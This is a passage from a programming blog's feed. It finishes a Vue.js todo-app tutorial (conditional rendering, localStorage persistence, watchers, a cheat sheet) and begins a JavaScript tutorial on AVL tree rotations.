<p><a href="https://github.com/amejiarosario/vue-todo-app/commit/24ae5a0f74c226325d88a2aaecad9e40b35760fb" target="_blank" rel="noopener">review diff</a></p>
<h2 id="Clearing-completed-tasks-amp-conditional-rendering-with-v-show">Clearing completed tasks &amp; conditional rendering with <code>v-show</code><a href="#Clearing-completed-tasks-amp-conditional-rendering-with-v-show" class="headerlink" title="Clearing completed tasks &amp; conditional rendering with v-show"></a></h2><p>We want to show <code>clear completed</code> button only if there are any completed task. We can accomplish this with the <code>v-show</code> directive:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"clear-completed"</span> @<span class="attr">click</span>=<span class="string">"clearCompleted"</span> <span class="attr">v-show</span>=<span class="string">"completedTodos.length"</span>&gt;</span>Clear completed<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>The v-show will hide the element if the expression evaluates to false or 0.</p>
<p>One way to clearing out completed tasks is by assigning the <code>activeTodos</code> property to the <code>todos</code>:</p>
<figure class="highlight js"><figcaption><span>app.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clearCompleted() &#123;</span><br><span class="line">  <span class="keyword">this</span>.todos = <span class="keyword">this</span>.activeTodos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Also, we have to add the computed property <code>completedTodos</code> that we use in the v-show</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">completedTodos() &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.todos.filter(<span class="function"><span class="params">t</span> =&gt;</span> t.isDone);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/amejiarosario/vue-todo-app/commit/dd7dd90" target="_blank" rel="noopener">review diff</a></p>
<h1 id="Vue-Conditional-Rendering-v-show-vs-v-if">Vue Conditional Rendering: <code>v-show</code> vs <code>v-if</code><a href="#Vue-Conditional-Rendering-v-show-vs-v-if" class="headerlink" title="Vue Conditional Rendering: v-show vs v-if"></a></h1><p><code>v-show</code> and <code>v-if</code> looks very similar, but they work differently. <code>v-if</code> removes the element from the DOM and disable events, while <code>v-show</code> hides it with the CSS <code>display: none;</code>. So, <code>v-if</code> is more expensive than <code>v-show</code>.</p>
<blockquote>
<p>If you foresee the element being toggling visibility very often then you should use <code>v-show</code>. If not, then use <code>v-if</code>.</p>
</blockquote>
<p>We can hide the footer and central section if there‚Äôs no todo list.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"main"</span> <span class="attr">v-if</span>=<span class="string">"todos.length"</span>&gt;</span>... <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">"footer"</span> <span class="attr">v-if</span>=<span class="string">"todos.length"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/amejiarosario/vue-todo-app/commit/790b241" target="_blank" rel="noopener">review diff</a></p>
<h1 id="Local-Storage">Local Storage<a href="#Local-Storage" class="headerlink" title="Local Storage"></a></h1><p>On every refresh, our list gets reset. This is useful for dev but not for users. Let‚Äôs persist our Todos in the local storage.</p>
<blockquote>
<p>Local storage vs. Session storage. <strong>Session</strong> data goes away when you close the window or expire after a specific time. <strong>Local storage</strong> doesn‚Äôt have an expiration time.</p>
</blockquote>
<p>The way <code>localStorage</code> works is straightforward. It is global variable and has only 4 methods:</p>
<ul>
<li><code>localStorage.setItem(key, value)</code>: key/value storage. <code>key</code> and <code>value</code> are coerced into a string.</li>
<li><code>localStorage.getItem(key)</code>: get the item by key.</li>
<li><code>localStorage.removeItem(key)</code>: remove item matching the key.</li>
<li><code>localStorage.clear()</code>: clear all items for the current hostname.</li>
</ul>
<p>We are going to use <code>getItem</code> and <code>setItem</code>. First we need to define a storage key:</p>
<figure class="highlight js"><figcaption><span>app.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> LOCAL_STORAGE_KEY = <span class="string">'todo-app-vue'</span>;</span><br></pre></td></tr></table></figure>
<p>Then we replace <code>data.todos</code> to get items (if any) from the local storage:</p>
<figure class="highlight js"><figcaption><span>app.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">  title: <span class="string">'Todos'</span>,</span><br><span class="line">  todos: <span class="built_in">JSON</span>.parse(localStorage.getItem(LOCAL_STORAGE_KEY)) || [</span><br><span class="line">    &#123; <span class="attr">text</span>: <span class="string">'Learn JavaScript ES6+ goodies'</span>, <span class="attr">isDone</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">text</span>: <span class="string">'Learn Vue'</span>, <span class="attr">isDone</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">text</span>: <span class="string">'Build something awesome'</span>, <span class="attr">isDone</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">  ],</span><br><span class="line">  editing: <span class="literal">null</span>,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<p>We have to use <code>JSON.parse</code> because everything gets stored as a string and we need to convert it to an object.</p>
<p><code>getItem</code> will retrieve the saved todos from the <code>localstorage</code>. However, we are saying it yet. Let‚Äôs see how we can do that.</p>
<h1 id="Vue-Watchers">Vue Watchers<a href="#Vue-Watchers" class="headerlink" title="Vue Watchers"></a></h1><p>For saving, we are going to use the Vue watchers.</p>
<blockquote>
<p>Vue watchers vs. Computed properties. Computed properties are usually used to ‚Äúcompute‚Äù and cache the value of 2 or more properties. Watchers are more low level than computed properties. Watchers allow you to ‚Äúwatch‚Äù for changes on a single property. This is useful for performing expensive operations like saving to DB, API calls and so on.</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">watch: &#123;</span><br><span class="line">  todos: &#123;</span><br><span class="line">    deep: <span class="literal">true</span>,</span><br><span class="line">    handler(newValue) &#123;</span><br><span class="line">      localStorage.setItem(LOCAL_STORAGE_KEY, <span class="built_in">JSON</span>.stringify(newValue));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<p>This expression watches for changes in our <code>todos</code> data. Deep means that it recursively watches for changes in the values inside arrays and objects. If there‚Äôs a change, we save them to the local storage.</p>
<p><a href="https://github.com/amejiarosario/vue-todo-app/commit/579da19" target="_blank" rel="noopener">review diff</a></p>
<p>Once you change some todos, you will see they are stored in the local storage. You can access them using the browser‚Äôs dev tools:</p>
<p><img src="/images/local-storage-devtools.jpg" alt="local storage"></p>
<p>The last part to implement is the routing! However, for that, we need to explain some more concepts and will do that in the next post.</p>
<hr>
<p>In the next tutorial, we are going to switch gears a little bit and go deeper into Vue Components, Routing, and Local Storage. Stay tuned!</p>
<h1 id="Summary-Vue-cheatsheet">Summary: Vue cheatsheet<a href="#Summary-Vue-cheatsheet" class="headerlink" title="Summary: Vue cheatsheet"></a></h1><p>We learned a lot! Here is a summary:</p>
<div class="table--responsive">
  <table class="table">
    <caption>Binders</caption>
    <thead>
      <th>Name</th>
      <th>Description</th>
      <th>Examples</th>
    </thead>

    <tbody>
      <tr>
        <td> Mustache </td>
        <td>Variable that is replaced with variable‚Äôs value</td>
        <td>
          <code>&lt;h1&gt;Vue.js Tutorial for beginners&lt;/h1&gt;</code>
        </td>
      </tr>
      <tr>
        <td> v-bind </td>
        <td>Bind to HTML attribute</td>
        <td>
          <code>&lt;span v-bind:title=&quot;tooltip&quot;&gt;&lt;/span&gt;</code> <br>
          <code>&lt;div v-bind:id=&quot;dynamicId&quot;&gt;&lt;/div&gt;</code>
          <code>&lt;button v-bind:disabled=&quot;isButtonDisabled&quot;&gt;Button&lt;/button&gt;</code>
        </td>
      </tr>

      <tr>
        <td> :</td>
        <td>Shortcut for v-bind</td>
        <td>
          <code>&lt;span :title=&quot;tooltip&quot;&gt;&lt;/span&gt;</code>
          <code>&lt;li v-bind:class=&quot;{completed: todo.isDone }&quot;&gt;&lt;/li&gt;</code>
        </td>
      </tr>

      <tr>
        <td> v-text </td>
        <td>Inject text into the element</td>
        <td>
          <code>&lt;h1 v-text=&quot;title&quot;&gt;&lt;/h1&gt;</code>
        </td>
      </tr>

      <tr>
        <td> v-html </td>
        <td>Inject raw HTML into the element</td>
        <td>
          <code>&lt;blog-post v-html=&quot;content&quot;&gt;&lt;/blog-post&gt;</code>
        </td>
      </tr>

    </tbody>
  </table>
</div>

<div class="table--responsive">
  <table class="table">
    <caption>List Rendering</caption>
    <thead>
      <th>Name</th>
      <th>Description</th>
      <th>Examples</th>
    </thead>

    <tbody>
      <tr>
        <td> v-for </td>
        <td>Iterate over elements</td>
        <td>
          <code>&lt;li v-for=&quot;todo in todos&quot;&gt;&lt;/li&gt;</code>
        </td>
      </tr>

      <tr>
        <td> v-for </td>
        <td>Iterate with index</td>
        <td>
          <code>&lt;li v-for=&quot;(item, index) in items&quot;&gt;</code><br>
          <code>  {{ parentMessage }} - {{ index }} - {{ item.message }}</code><br>
          <code>&lt;/li&gt;</code>
        </td>
      </tr>

      <tr>
        <td> v-for </td>
        <td>Iterate over object‚Äôs values</td>
        <td>
          <code>&lt;li v-for=&quot;value in object&quot;&gt;</code><br>
          <code>  {{ value }}  </code><br>
          <code>&lt;/li&gt;</code>
        </td>
      </tr>

      <tr>
        <td> v-for </td>
        <td>Iterate over object‚Äôs keys/values</td>
        <td>
          <code>&lt;li v-for=&quot;(value, key) in object&quot;&gt;</code><br>
          <code>  {{ key }}: {{ value }}  </code><br>
          <code>&lt;/li&gt;</code>
        </td>
      </tr>

      <tr>
        <td> v-for </td>
        <td>Iterate with keys, values and index</td>
        <td>
          <code>&lt;li v-for=&quot;(value, key, index) in object&quot;&gt;</code><br>
          <code>  {{index}}.{{ key }}: {{ value }}  </code><br>
          <code>&lt;/li&gt;</code>
        </td>
      </tr>

    </tbody>
  </table>
</div>

<div class="table--responsive">
  <table class="table">
    <caption>Events</caption>
    <thead>
      <th>Name</th>
      <th>Description</th>
      <th>Examples</th>
    </thead>

    <tbody>
      <tr>
        <td> v-on:click </td>
        <td>Invoke callback on click</td>
        <td>
          <code>&lt;button class=&quot;destroy&quot; v-on:click=&quot;destroyTodo(todo)&quot;&gt;&lt;/button&gt;</code>
        </td>
      </tr>

      <tr>
        <td> @ </td>
        <td><code>@</code> is shorcut for <code>v-on:</code></td>
        <td>
          <code>&lt;input class=&quot;edit&quot;
              @keyup.esc=&quot;cancelEditing&quot;
              @keyup.enter=&quot;finishEditing&quot;
              @blur=&quot;finishEditing&quot;&gt;</code>
        </td>
      </tr>

      <tr>
        <td> v-on:dblclick </td>
        <td>Invoke callback on double-click</td>
        <td>
          <code>&lt;label @dblclick=&quot;startEditing(todo)&quot;&gt;&lt;/label&gt;</code>
        </td>
      </tr>

      <tr>
        <td> @keyup.enter </td>
        <td>Invoke callback on keyup <kbd>enter</kbd></td>
        <td>
          <code>&lt;input @keyup.enter=&quot;createTodo&quot;&gt;</code>
        </td>
      </tr>

      <tr>
        <td> @keyup.esc </td>
        <td>Invoke callback on keyup <kbd>esc</kbd></td>
        <td>
          <code>&lt;input @keyup.esc=&quot;cancelEditing&quot;&gt;</code>
        </td>
      </tr>

    </tbody>
  </table>
</div>

<div class="table--responsive">
  <table class="table">
    <caption>Conditional Rendering</caption>
    <thead>
      <th>Name</th>
      <th>Description</th>
      <th>Examples</th>
    </thead>

    <tbody>
      <tr>
        <td> v-show </td>
        <td>Show or hide the element if the expression evaluates to truthy</td>
        <td>
          <code>&lt;button v-show=&quot;completedTodos.length&quot;&gt;Clear completed&lt;/button&gt;</code>
        </td>
      </tr>

      <tr>
        <td> v-if </td>
        <td>Remove or add the element if the expression evaluates to truthy</td>
        <td>
          <code>&lt;footer v-if=&quot;todos.length&quot;&gt;...&lt;/footer&gt;</code>
        </td>
      </tr>

    </tbody>
  </table>
</div>

<div class="table--responsive">
  <table class="table">
    <caption>Automatic Data<->DOM Sync</-></caption>
    <thead>
      <th>Name</th>
      <th>Description</th>
      <th>Examples</th>
    </thead>

    <tbody>
      <tr>
        <td> v-model </td>
        <td>Keep data and DOM in sync automatially</td>
        <td>
          <code>&lt;input class=&quot;toggle&quot; type=&quot;checkbox&quot; v-model=&quot;todo.isDone&quot;&gt;</code>
        </td>
      </tr>

    </tbody>
  </table>
</div>

<div class="table--responsive">
  <table class="table">
    <caption>Vue instance</caption>
    <thead>
      <th>Examples</th>
    </thead>

    <tbody>
      <tr>
        <td>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Vue Instance</span></span><br><span class="line"><span class="keyword">const</span> todoApp = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  <span class="comment">// element matcher</span></span><br><span class="line">  el: <span class="string">'.todoapp'</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Reactive data, when something changes here it gets updated on the templates</span></span><br><span class="line">  <span class="comment">// data should be a function so every instance get's a different data</span></span><br><span class="line">  data() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      title: <span class="string">'Todos'</span>,</span><br><span class="line">      editing: <span class="literal">null</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// invoke this functions on event handlers, etc.</span></span><br><span class="line">  methods: &#123;</span><br><span class="line">    createTodo(event) &#123;</span><br><span class="line">      <span class="keyword">const</span> textbox = event.target;</span><br><span class="line">      <span class="keyword">this</span>.todos.push(&#123; <span class="attr">text</span>: textbox.value.trim(), <span class="attr">isDone</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">      textbox.value = <span class="string">''</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// cached methods (only get invokes when data changes)</span></span><br><span class="line">  computed: &#123;</span><br><span class="line">    activeTodos() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.todos.filter(<span class="function"><span class="params">t</span> =&gt;</span> !t.isDone);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// watch for changes on the data</span></span><br><span class="line">  watch: &#123;</span><br><span class="line">    todos: &#123;</span><br><span class="line">      deep: <span class="literal">true</span>,</span><br><span class="line">      handler(newValue, oldValue) &#123;</span><br><span class="line">        localStorage.setItem(LOCAL_STORAGE_KEY, <span class="built_in">JSON</span>.stringify(newValue));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

        </td>
      </tr>

    </tbody>
  </table>
</div>


<!-- Feeback
https://news.ycombinator.com/item?id=17762421
Good intro, few nitpicks:
- it should be mentioned that components have to return data as a function [0]

- v-for should ideally be used with keys [1]

[0] https://vuejs.org/v2/guide/components.html#data-Must-Be-a-Fu...

[1] https://vuejs.org/v2/guide/list.html#key

One should definitely mention the vue.js docs for basics.

-->
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;In this tutorial, you are going to learn the basics of Vue.js. While we learn, we are going to build a Todo app that will help us to put in practice what we learn.&lt;/p&gt;
    
    </summary>
    
      <category term="Programming" scheme="https://adrianmejia.com/categories/Programming/"/>
    
      <category term="Web Development" scheme="https://adrianmejia.com/categories/Programming/Web-Development/"/>
    
    
      <category term="javascript" scheme="https://adrianmejia.com/tags/javascript/"/>
    
      <category term="vue.js" scheme="https://adrianmejia.com/tags/vue-js/"/>
    
      <category term="todo app" scheme="https://adrianmejia.com/tags/todo-app/"/>
    
  </entry>
  
  <entry>
    <title>Self-balanced Binary Search Trees with AVL</title>
    <link href="https://adrianmejia.com/blog/2018/07/16/Self-balanced-Binary-Search-Trees-with-AVL-tree-Data-Structure-for-beginners/"/>
    <id>https://adrianmejia.com/blog/2018/07/16/Self-balanced-Binary-Search-Trees-with-AVL-tree-Data-Structure-for-beginners/</id>
    <published>2018-07-16T19:43:11.000Z</published>
    <updated>2018-07-16T19:43:11.000Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>


<p>Binary Search Trees are used for many things that we might not be aware of. For instance: Website‚Äôs databases use trees to search data more efficiently. HTML DOM elements are represented as a tree. For trees to be effective they need to be balanced. So, we are going to discuss how to keep the BST balanced as you add and remove elements.</p>
<a id="more"></a>
<p>In this post, we are going to explore different techniques to balance a tree. We are going to use rotations to move nodes around and the AVL algorithm to keep track if the tree is balanced or needs adjustments. Let‚Äôs dig in!</p>
<hr>
<p>This post is part of a tutorial series:</p>
<p><strong>Learning Data Structures and Algorithms (DSA) for Beginners</strong></p>
<ol>
<li><p><a href="/blog/2018/04/04/how-you-can-change-the-world-learning-data-structures-algorithms-free-online-course-tutorial/">Intro to algorithm‚Äôs time complexity and Big O notation</a></p>
<!-- 1. Intro to Algorithm's Time Complexity and Big O Notation **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/04/05/most-popular-algorithms-time-complexity-every-programmer-should-know-free-online-tutorial-course/">Eight time complexities that every programmer should know</a></p>
<!-- 1. Eight time complexities that every programmer should know **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/04/28/Data-Structures-Time-Complexity-for-Beginners-Arrays-HashMaps-Linked-Lists-Stacks-Queues-tutorial/">Data Structures for Beginners: Arrays, HashMaps, and Lists</a></p>
<!-- 1. Data Structures for Beginners: Arrays, HashMaps, and Lists **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/05/14/Data-Structures-for-Beginners-Graphs-Time-Complexity-tutorial/">Graph Data Structures for Beginners</a></p>
<!-- 1. Graph Data Structures for Beginners **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/06/11/Data-Structures-for-Beginners-Trees-binary-search-tree-tutorial/">Trees Data Structures for Beginners</a></p>
<!-- 1. Trees Data Structures for Beginners **üëà you are here** -->
</li>
<li><p>Self-balanced Binary Search Trees <strong>üëà you are here</strong></p>
</li>
<li><p><a href="/blog/2018/04/24/Analysis-of-Recursive-Algorithms/">Appendix I: Analysis of Recursive Algorithms</a></p>
</li>
</ol>
<hr>
<p>Let‚Äôs start by defining what is a balanced tree and the pitfalls of an unbalanced tree.</p>
<h1 id="Balanced-vs-Unbalanced-Binary-Search-Tree">Balanced vs Unbalanced Binary Search Tree<a href="#Balanced-vs-Unbalanced-Binary-Search-Tree" class="headerlink" title="Balanced vs Unbalanced Binary Search Tree"></a></h1><p>As discussed in the
<a href="/blog/2018/06/11/data-structures-for-beginners-trees-binary-search-tree-tutorial/">previous post</a>
the worst nightmare for a BST is to be given numbers in order (e.g. 1, 2, 3, 4, 5, 6, 7, ‚Ä¶).</p>
<img src="/images/balanced-vs-non-balanced-tree.jpg" title="Balanced vs unbalanced Tree">
<p>If we ended up with a tree like the one on the left we are screwed. This is because to find out if a node is on the tree or not you will have to visit every node. That takes <em>O(n)</em>, while if we keep the node balanced in every insertion or deletion we could have <em>O(log n)</em>.</p>
<p>Again, this might not look like a big difference but when you have a million nodes the difference is abysmal. We are talking about visiting <code>1,000,000</code>  nodes vs visiting <code>20</code>!</p>
<p>‚ÄúOk, I‚Äôm sold. How do I keep the tree balanced?‚Äù you might ask. Well, let‚Äôs first learn when to tell that a tree is unbalanced.</p>
<h1 id="When-a-tree-is-balanced-non-balanced">When a tree is balanced/non-balanced?<a href="#When-a-tree-is-balanced-non-balanced" class="headerlink" title="When a tree is balanced/non-balanced?"></a></h1><p>Take a look at the following trees and tell which one is balanced and which one is not.</p>
<img src="/images/full-complete-perfect-binary-tree.jpg" title="Full vs. Complete vs. Perfect Binary Tree">
<p>Well, a tree is definately balanced when is a perfect tree (all the levels on the tree have maximum number of nodes). But what about
<a href="/blog/2018/06/11/data-structures-for-beginners-trees-binary-search-tree-tutorial/#Full-Complete-and-Perfect-binary-trees">full trees</a>
or
<a href="/blog/2018/06/11/data-structures-for-beginners-trees-binary-search-tree-tutorial/#Full-Complete-and-Perfect-binary-trees">complete trees</a>
?</p>
<p>The ‚Äúcomplete tree‚Äù looks somewhat balanced, right? What about the full tree? Well, it starts to get tricky. Let‚Äôs work on a definition.</p>
<p>A tree is <strong>balanced</strong> if:</p>
<ol>
<li>The left subtree height and the right subtree height differ by at most 1.</li>
<li>Visit every node making sure rule <strong>#1</strong> is satisfied.</li>
</ol>
<p>For instance, if you have a tree with 7 nodes:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    10</span><br><span class="line">   /   \</span><br><span class="line">  5    20</span><br><span class="line"> /     / \</span><br><span class="line">4    15   30</span><br><span class="line">     /</span><br><span class="line">    12</span><br></pre></td></tr></table></figure>
<p>If you check the subtrees‚Äô
<a href="/blog/2018/06/11/data-structures-for-beginners-trees-binary-search-tree-tutorial/#Trees-basic-concepts">heights</a> (edge counts to farthest leave)
recursively you will notice they never differ by more than one.</p>
<ul>
<li><code>10</code> descendants:<ul>
<li>Left subtree <code>5</code> has a height of 1, while right subtree <code>20</code> has a height of 2. The difference is one so: <strong>Balanced</strong>!</li>
</ul>
</li>
<li><code>20</code> descendants:<ul>
<li>Left subtree<code>15</code> has a height of 1, while right subtree <code>30</code> has a height of 0. So the diff is 1:  <strong>Balanced</strong>!</li>
</ul>
</li>
</ul>
<p>On the other hand, take a look at this tree:
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">     40</span><br><span class="line">   /   \</span><br><span class="line">  35    60*</span><br><span class="line"> /     /</span><br><span class="line">25    50</span><br><span class="line">     /</span><br><span class="line">    45</span><br></pre></td></tr></table></figure></p>
<p>Let‚Äôs check the subtrees height recursively:</p>
<ul>
<li><code>40</code> descendants:<ul>
<li>Left subtree <code>35</code> has a height of 1, while right subtree <code>60</code> has a height of 2. The difference is one so: <strong>Balanced</strong>!</li>
</ul>
</li>
<li><code>60</code> descendants:<ul>
<li>Left subtree <code>50</code> has a height of 2, while the right subtree (none) has a height of 0. The difference between 2 and 0 is more than one, so: <strong>NOT balanced</strong>!</li>
</ul>
</li>
</ul>
<p>Hopefully, now you can calculate balanced and unbalanced trees. What can we do when we find an unbalanced tree? We do rotations!</p>
<p>If we take the same tree as before and move <code>50</code> to the place of <code>60</code> we get the following:
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     40</span><br><span class="line">   /   \</span><br><span class="line">  35    50</span><br><span class="line"> /     /   \</span><br><span class="line">25    45    60*</span><br></pre></td></tr></table></figure></p>
<p>After rotating <code>60</code> to the right, It‚Äôs balanced! Let‚Äôs learn all about it in the next section.</p>
<h1 id="Tree-rotations">Tree rotations<a href="#Tree-rotations" class="headerlink" title="Tree rotations"></a></h1><p>Before throwing any line of code, let‚Äôs spend some time thinking about how to balance small trees using rotations.</p>
<h2 id="Left-Rotation">Left Rotation<a href="#Left-Rotation" class="headerlink" title="Left Rotation"></a></h2><p>Let‚Äôs say that we have the following tree with ascending values: <code>1-2-3</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1*                                        2</span><br><span class="line"> \                                       /  \</span><br><span class="line">  2     ---| left-rotation(1) |--&gt;      1*   3</span><br><span class="line">   \</span><br><span class="line">    3</span><br></pre></td></tr></table></figure>
<p>To perform a left rotation on node <code>1</code>, we move it down as it‚Äôs children‚Äôs (<code>2</code>) <strong>left</strong> descendant.</p>
<img src="/images/left-rotation2.gif" title="Left rotate on 2">
<p>This is called <strong>single left rotation</strong> or <strong>Left-Left (LL) rotation</strong>.</p>
<p>For the coding part, let‚Äôs do another example:
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1                                 1</span><br><span class="line"> \                                 \</span><br><span class="line">  2*                                3</span><br><span class="line">   \    --left-rotation(2)-&gt;       / \</span><br><span class="line">    3                             2*  4</span><br><span class="line">     \</span><br><span class="line">      4</span><br></pre></td></tr></table></figure></p>
<p>To define the tree we are using
<a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/tree-node.js" target="_blank" rel="noopener">TreeNode </a>
that we developed in the
<a href="https://adrianmejia.com/blog/2018/06/11/data-structures-for-beginners-trees-binary-search-tree-tutorial/#BST-Implementation">previous post</a>.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> n1 = <span class="keyword">new</span> TreeNode(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> n2 = <span class="keyword">new</span> TreeNode(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">const</span> n3 = <span class="keyword">new</span> TreeNode(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">const</span> n4 = <span class="keyword">new</span> TreeNode(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">n1.right = n2;</span><br><span class="line">n2.right = n3;</span><br><span class="line">n3.right = n4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> newParent = leftRotation(n2);</span><br><span class="line"><span class="built_in">console</span>.log(newParent === n3); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>In this case, we are rotating 2 to the left. Let‚Äôs implement the <code>leftRotation</code> function.</p>
<figure class="highlight js"><figcaption><span>leftRotation</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/tree-rotations.js" target="_blank" rel="noopener">Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leftRotation</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> newParent = node.right; <span class="comment">// e.g. 3</span></span><br><span class="line">  <span class="keyword">const</span> grandparent = node.parent; <span class="comment">// e.g. 1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// make 1 the parent of 3 (previously was the parent of 2)</span></span><br><span class="line marked">  swapParentChild(node, newParent, grandparent);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// do LL rotation</span></span><br><span class="line">  newParent.left = node; <span class="comment">// makes 2 the left child of 3</span></span><br><span class="line">  node.right = <span class="literal">undefined</span>; <span class="comment">// clean 2's right child</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> newParent; <span class="comment">// 3 is the new parent (previously was 2)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Notice that we are using a utility function to swap parents called <code>swapParentChild</code>.</p>
